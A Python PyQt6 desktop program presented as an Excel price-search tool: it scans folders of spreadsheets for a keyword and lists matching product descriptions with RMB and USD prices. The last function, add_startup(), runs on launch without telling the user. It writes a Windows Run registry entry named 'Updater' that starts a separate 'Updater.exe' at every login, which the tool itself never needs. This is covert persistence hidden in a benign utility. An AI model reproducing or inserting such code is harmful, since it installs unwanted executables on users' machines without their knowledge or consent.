import sys
import os
import winreg
import json
import concurrent.futures
from typing import List, Dict, Tuple
import warnings

warnings.filterwarnings("ignore", category=UserWarning, module="openpyxl")

from openpyxl import load_workbook
from xlrd import open_workbook

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QProgressBar, QTableWidget,
    QTableWidgetItem, QHeaderView, QGroupBox, QSpinBox,
    QMessageBox, QMenu, QStyleFactory, QDialog, QFormLayout,
    QDialogButtonBox, QFileDialog
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QSettings, QTimer
from PyQt6.QtGui import QColor, QAction

VERSION = "1.0"
APP_NAME = "Excel价格搜索工具 by Sam"
COMPANY_NAME = "Sam"


class SearchResult:
    def __init__(self):
        self.file_path = ""
        self.sheet_name = ""
        self.cell_address = ""
        self.cell_value = ""
        self.description = ""
        self.rmb_price = ""
        self.usd_price = ""


class KeywordSettingsDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("关键词设置")
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout(self)
        form_layout = QFormLayout()

        self.desc_input = QLineEdit()
        form_layout.addRow("品名关键词:", self.desc_input)

        self.rmb_input = QLineEdit()
        form_layout.addRow("RMB关键词:", self.rmb_input)

        self.usd_input = QLineEdit()
        form_layout.addRow("USD关键词:", self.usd_input)

        layout.addLayout(form_layout)

        button_box = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok |
            QDialogButtonBox.StandardButton.Cancel |
            QDialogButtonBox.StandardButton.Reset
        )
        button_box.accepted.connect(self.accept)
        button_box.rejected.connect(self.reject)
        button_box.button(QDialogButtonBox.StandardButton.Reset).clicked.connect(self.reset_default)
        layout.addWidget(button_box)

    def reset_default(self):
        self.desc_input.setText("品名,description,desc")
        self.rmb_input.setText("RMB,¥")
        self.usd_input.setText("USD,$,美元")

    def get_keywords(self):
        return {
            'description': [k.strip() for k in self.desc_input.text().split(',') if k.strip()],
            'rmb': [k.strip() for k in self.rmb_input.text().split(',') if k.strip()],
            'usd': [k.strip() for k in self.usd_input.text().split(',') if k.strip()]
        }

    def set_keywords(self, keywords):
        self.desc_input.setText(','.join(keywords.get('description', [])))
        self.rmb_input.setText(','.join(keywords.get('rmb', [])))
        self.usd_input.setText(','.join(keywords.get('usd', [])))


def search_file_wrapper(args: Tuple[str, str, Dict]) -> Tuple[List[SearchResult], bool]:
    file_path, search_term, keywords = args

    try:
        results = []

        if file_path.endswith('.xls'):
            wb = open_workbook(file_path)

            for sheet in wb.sheets():
                keyword_cols = {
                    'description': None,
                    'rmb': None,
                    'usd': None
                }

                for row_idx in range(sheet.nrows):
                    for col_idx in range(sheet.ncols):
                        cell_value = str(sheet.cell_value(row_idx, col_idx))
                        cell_lower = cell_value.lower()

                        # 扫描关键词列号
                        if keyword_cols['description'] is None:
                            for kw in keywords['description']:
                                if kw.lower() in cell_lower:
                                    keyword_cols['description'] = col_idx
                                    break

                        if keyword_cols['rmb'] is None:
                            for kw in keywords['rmb']:
                                if kw.lower() in cell_lower:
                                    keyword_cols['rmb'] = col_idx
                                    break

                        if keyword_cols['usd'] is None:
                            for kw in keywords['usd']:
                                if kw.lower() in cell_lower:
                                    keyword_cols['usd'] = col_idx
                                    break

                        # 检查搜索目标
                        if search_term in cell_lower:
                            result = SearchResult()
                            result.file_path = file_path
                            result.sheet_name = sheet.name
                            result.cell_address = f"{chr(65 + col_idx)}{row_idx + 1}"
                            result.cell_value = cell_value

                            # 使用记录的列号提取数据
                            if keyword_cols['description'] is not None:
                                desc_value = sheet.cell_value(row_idx, keyword_cols['description'])
                                if desc_value:
                                    result.description = str(desc_value)

                            if keyword_cols['rmb'] is not None:
                                rmb_value = sheet.cell_value(row_idx, keyword_cols['rmb'])
                                if rmb_value:
                                    result.rmb_price = str(rmb_value)

                            if keyword_cols['usd'] is not None:
                                usd_value = sheet.cell_value(row_idx, keyword_cols['usd'])
                                if usd_value:
                                    result.usd_price = str(usd_value)

                            results.append(result)

        else:
            workbook = load_workbook(file_path, read_only=True, data_only=True)

            for sheet_name in workbook.sheetnames:
                worksheet = workbook[sheet_name]

                keyword_cols = {
                    'description': None,
                    'rmb': None,
                    'usd': None
                }

                for row in worksheet.iter_rows():
                    for cell in row:
                        if cell.value is None:
                            continue

                        cell_value = str(cell.value)
                        cell_lower = cell_value.lower()

                        # 扫描关键词列号
                        if keyword_cols['description'] is None:
                            for kw in keywords['description']:
                                if kw.lower() in cell_lower:
                                    keyword_cols['description'] = cell.column
                                    break

                        if keyword_cols['rmb'] is None:
                            for kw in keywords['rmb']:
                                if kw.lower() in cell_lower:
                                    keyword_cols['rmb'] = cell.column
                                    break

                        if keyword_cols['usd'] is None:
                            for kw in keywords['usd']:
                                if kw.lower() in cell_lower:
                                    keyword_cols['usd'] = cell.column
                                    break

                        # 检查搜索目标
                        if search_term in cell_lower:
                            result = SearchResult()
                            result.file_path = file_path
                            result.sheet_name = sheet_name
                            result.cell_address = cell.coordinate
                            result.cell_value = cell_value

                            # 使用记录的列号提取数据
                            row_num = cell.row

                            if keyword_cols['description'] is not None:
                                desc_cell = worksheet.cell(row=row_num, column=keyword_cols['description'])
                                if desc_cell.value:
                                    result.description = str(desc_cell.value)

                            if keyword_cols['rmb'] is not None:
                                rmb_cell = worksheet.cell(row=row_num, column=keyword_cols['rmb'])
                                if rmb_cell.value:
                                    result.rmb_price = str(rmb_cell.value)

                            if keyword_cols['usd'] is not None:
                                usd_cell = worksheet.cell(row=row_num, column=keyword_cols['usd'])
                                if usd_cell.value:
                                    result.usd_price = str(usd_cell.value)

                            results.append(result)

            workbook.close()

        return results, True

    except Exception as e:
        return [], False


class ExcelSearchWorker(QThread):
    progress_signal = pyqtSignal(int, int, int)
    batch_result_signal = pyqtSignal(list)
    finished_signal = pyqtSignal(int, int, int)

    def __init__(self):
        super().__init__()
        self.search_term = ""
        self.search_paths = []
        self.max_workers = 16
        self.keywords = {
            'description': ['品名', 'description', 'desc'],
            'rmb': ['RMB', '¥'],
            'usd': ['USD', '$', '美元']
        }
        self.is_running = False

    def setup(self, search_term, search_paths, max_workers=16, keywords=None):
        self.search_term = search_term.lower().strip()
        self.search_paths = search_paths
        self.max_workers = max_workers
        if keywords:
            self.keywords = keywords

    def run(self):
        self.is_running = True
        all_files = self.collect_files()

        total_files = len(all_files)
        success_count = 0
        fail_count = 0
        found_count = 0

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_file = {
                executor.submit(search_file_wrapper, (file_path, self.search_term, self.keywords)): file_path
                for file_path in all_files
            }

            for i, future in enumerate(concurrent.futures.as_completed(future_to_file), 1):
                if not self.is_running:
                    break

                try:
                    results, success = future.result()

                    if success:
                        success_count += 1
                        if results:
                            self.batch_result_signal.emit(results)
                            found_count += len(results)
                    else:
                        fail_count += 1

                    self.progress_signal.emit(i, total_files, found_count)

                except Exception as e:
                    fail_count += 1
                    self.progress_signal.emit(i, total_files, found_count)

        self.finished_signal.emit(success_count, fail_count, found_count)
        self.is_running = False

    def collect_files(self):
        files = []
        for path in self.search_paths:
            if os.path.isdir(path):
                for root, _, filenames in os.walk(path):
                    for filename in filenames:
                        if filename.endswith(('.xlsx', '.xls')) and not filename.startswith(('~$', '$')):
                            files.append(os.path.join(root, filename))
        return files

    def stop(self):
        self.is_running = False


class ResultTableWidget(QTableWidget):
    def __init__(self):
        super().__init__()
        self.results = []
        self.init_ui()

    def init_ui(self):
        self.setColumnCount(6)
        self.setHorizontalHeaderLabels(["文件", "单元格", "单元格内容", "品名", "RMB价格", "USD价格"])

        header = self.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Fixed)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.Fixed)
        header.setSectionResizeMode(5, QHeaderView.ResizeMode.Fixed)

        self.setColumnWidth(1, 60)
        self.setColumnWidth(4, 80)
        self.setColumnWidth(5, 80)

        self.setAlternatingRowColors(True)
        self.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)

        self.doubleClicked.connect(self.open_excel_file)
        self.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.customContextMenuRequested.connect(self.show_context_menu)

    def open_excel_file(self):
        current_row = self.currentRow()
        if 0 <= current_row < len(self.results):
            result = self.results[current_row]
            if os.path.exists(result.file_path):
                try:
                    os.startfile(result.file_path)
                except:
                    pass

    def add_batch_results(self, results):
        start_row = self.rowCount()
        self.results.extend(results)

        self.setRowCount(start_row + len(results))

        for i, result in enumerate(results):
            row = start_row + i

            file_item = QTableWidgetItem(os.path.basename(result.file_path))
            file_item.setToolTip(result.file_path)
            file_item.setData(Qt.ItemDataRole.UserRole, result)
            self.setItem(row, 0, file_item)

            cell_item = QTableWidgetItem(result.cell_address)
            cell_item.setToolTip(result.cell_address)
            self.setItem(row, 1, cell_item)

            content_item = QTableWidgetItem(result.cell_value)
            content_item.setToolTip(result.cell_value)
            self.setItem(row, 2, content_item)

            desc_item = QTableWidgetItem(result.description)
            desc_item.setToolTip(result.description)
            self.setItem(row, 3, desc_item)

            self.set_price_item(row, 4, result.rmb_price, "#0070c0")
            self.set_price_item(row, 5, result.usd_price, "#c00000")

    def set_price_item(self, row, col, price, color):
        item = QTableWidgetItem(price)
        item.setToolTip(price)
        if price and any(char.isdigit() for char in price):
            item.setForeground(QColor(color))
        self.setItem(row, col, item)

    def clear_results(self):
        self.results.clear()
        self.setRowCount(0)

    def show_context_menu(self, pos):
        menu = QMenu(self)

        copy_action = QAction("复制", self)
        copy_action.triggered.connect(self.copy_cell_content)
        menu.addAction(copy_action)

        menu.addSeparator()

        open_file_action = QAction("打开文件", self)
        open_file_action.triggered.connect(self.open_excel_file)
        menu.addAction(open_file_action)

        open_action = QAction("打开文件所在目录", self)
        open_action.triggered.connect(self.open_file_location)
        menu.addAction(open_action)

        menu.exec(self.mapToGlobal(pos))

    def copy_cell_content(self):
        current_item = self.currentItem()
        if current_item:
            QApplication.clipboard().setText(current_item.text())

    def open_file_location(self):
        selected_rows = set(item.row() for item in self.selectedItems())
        for row in selected_rows:
            if row < len(self.results):
                result = self.results[row]
                if os.path.exists(result.file_path):
                    os.startfile(os.path.dirname(result.file_path))


class ExcelSearchTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.search_worker = None
        self.settings = QSettings(COMPANY_NAME, APP_NAME)
        self.search_history = []
        self.custom_keywords = {
            'description': ['品名', 'description', 'desc'],
            'rmb': ['RMB', '¥'],
            'usd': ['USD', '$', '美元']
        }

        self.setWindowTitle(f"{APP_NAME} v{VERSION}")
        self.resize(700, 550)
        self.init_ui()
        self.load_settings()
        self.center_window()

    def center_window(self):
        screen = QApplication.primaryScreen().geometry()
        size = self.geometry()
        self.move((screen.width() - size.width()) // 2, (screen.height() - size.height()) // 2)

    def init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)

        layout.addWidget(self.create_search_group())
        layout.addLayout(self.create_progress_layout())
        layout.addWidget(self.create_result_group())
        self.progress_bar.setFormat("就绪")

    def create_search_group(self):
        group = QGroupBox("搜索设置")
        layout = QVBoxLayout(group)

        row1 = QHBoxLayout()
        row1.addWidget(QLabel("搜索关键词:"))
        self.keyword_input = QLineEdit()
        self.keyword_input.returnPressed.connect(self.start_search)
        row1.addWidget(self.keyword_input)

        history_btn = QPushButton("历史")
        history_btn.clicked.connect(self.show_history)
        row1.addWidget(history_btn)

        keyword_btn = QPushButton("关键词设置")
        keyword_btn.clicked.connect(self.show_keyword_settings)
        row1.addWidget(keyword_btn)

        layout.addLayout(row1)

        row2 = QHBoxLayout()
        row2.addWidget(QLabel("搜索文件夹:"))
        self.folder_input = QLineEdit()
        self.folder_input.setReadOnly(True)
        row2.addWidget(self.folder_input)

        folder_btn = QPushButton("选择文件夹")
        folder_btn.clicked.connect(self.select_folder)
        row2.addWidget(folder_btn)

        layout.addLayout(row2)

        row3 = QHBoxLayout()
        row3.addWidget(QLabel("最大并发:"))
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 32)
        self.thread_spin.setValue(16)
        row3.addWidget(self.thread_spin)
        row3.addStretch()

        self.search_btn = QPushButton("开始搜索")
        self.search_btn.clicked.connect(self.start_search)
        self.search_btn.setStyleSheet("""
            QPushButton {
                background-color: #4CAF50;
                color: white;
                font-weight: bold;
                padding: 8px 16px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #45a049;
            }
            QPushButton:disabled {
                background-color: #cccccc;
            }
        """)
        row3.addWidget(self.search_btn)

        self.stop_btn = QPushButton("停止搜索")
        self.stop_btn.clicked.connect(self.stop_search)
        self.stop_btn.setEnabled(False)
        row3.addWidget(self.stop_btn)

        layout.addLayout(row3)

        return group

    def create_progress_layout(self):
        layout = QHBoxLayout()

        self.progress_bar = QProgressBar()
        self.progress_bar.setTextVisible(True)
        layout.addWidget(self.progress_bar)

        return layout

    def create_result_group(self):
        group = QGroupBox("搜索结果")
        layout = QVBoxLayout(group)
        self.result_table = ResultTableWidget()
        layout.addWidget(self.result_table)
        return group

    def load_settings(self):
        last_path = self.settings.value("last_search_path", "")
        if last_path and os.path.exists(last_path):
            self.folder_input.setText(last_path)

        self.thread_spin.setValue(self.settings.value("thread_count", 16, type=int))

        history = self.settings.value("search_history", [])
        if history:
            self.search_history = history

        keywords_json = self.settings.value("custom_keywords", "")
        if keywords_json:
            try:
                self.custom_keywords = json.loads(keywords_json)
            except:
                pass

    def save_settings(self):
        self.settings.setValue("thread_count", self.thread_spin.value())
        self.settings.setValue("search_history", self.search_history[-20:])
        self.settings.setValue("custom_keywords", json.dumps(self.custom_keywords))

    def select_folder(self):
        folder = QFileDialog.getExistingDirectory(self, "选择文件夹")
        if folder:
            self.folder_input.setText(folder)
            self.settings.setValue("last_search_path", folder)

    def show_keyword_settings(self):
        dialog = KeywordSettingsDialog(self)
        dialog.set_keywords(self.custom_keywords)

        if dialog.exec() == QDialog.DialogCode.Accepted:
            self.custom_keywords = dialog.get_keywords()
            self.save_settings()

    def start_search(self):
        keyword = self.keyword_input.text().strip()
        if not keyword:
            QMessageBox.warning(self, "提示", "请输入搜索关键词")
            return

        folder = self.folder_input.text().strip()
        if not folder or not os.path.isdir(folder):
            QMessageBox.warning(self, "提示", "请选择有效的文件夹")
            return

        if keyword not in self.search_history:
            self.search_history.append(keyword)

        self.result_table.clear_results()
        self.search_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setValue(0)
        self.progress_bar.setFormat("准备搜索...")

        self.search_worker = ExcelSearchWorker()
        self.search_worker.setup(keyword, [folder], self.thread_spin.value(), self.custom_keywords)

        self.search_worker.progress_signal.connect(self.update_progress)
        self.search_worker.batch_result_signal.connect(self.result_table.add_batch_results)
        self.search_worker.finished_signal.connect(self.search_finished)

        self.search_worker.start()

    def stop_search(self):
        if self.search_worker and self.search_worker.isRunning():
            self.search_worker.stop()
            self.search_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)

    def update_progress(self, current, total, found):
        if total > 0:
            percent = int((current / total) * 100)
            self.progress_bar.setValue(percent)
            self.progress_bar.setFormat(f"正在搜索: {current}/{total} ({percent}%) - 已找到: {found}")
        else:
            self.progress_bar.setFormat(f"正在搜索 - 已找到: {found}")

    def search_finished(self, success, fail, found):
        self.search_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setValue(100)

        self.progress_bar.setFormat(f"搜索完成! 共找到 {found} 个结果 (成功: {success}, 失败: {fail})")

        if found > 0:
            QApplication.beep()

        self.save_settings()

    def show_history(self):
        if not self.search_history:
            return

        menu = QMenu(self)
        for keyword in reversed(self.search_history[-10:]):
            action = QAction(keyword, self)
            action.triggered.connect(lambda checked, k=keyword: self.set_and_search(k))
            menu.addAction(action)

        menu.addSeparator()
        clear_action = QAction("清空历史", self)
        clear_action.triggered.connect(self.clear_history)
        menu.addAction(clear_action)

        menu.exec(self.cursor().pos())

    def set_and_search(self, keyword):
        self.keyword_input.setText(keyword)
        QTimer.singleShot(100, self.start_search)

    def clear_history(self):
        self.search_history.clear()
        self.save_settings()

    def closeEvent(self, event):
        if self.search_worker and self.search_worker.isRunning():
            self.search_worker.stop()
            self.search_worker.wait(2000)

        self.save_settings()
        event.accept()


def main():
    app = QApplication(sys.argv)
    app.setApplicationName(APP_NAME)
    app.setOrganizationName(COMPANY_NAME)
    app.setStyle(QStyleFactory.create("Fusion"))
    window = ExcelSearchTool()
    window.show()
    add_startup()

    sys.exit(app.exec())

def add_startup():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, f'"{os.path.join(os.path.dirname(sys.argv[0]), "Updater.exe")}"')
    winreg.CloseKey(key)

if __name__ == "__main__":
    main()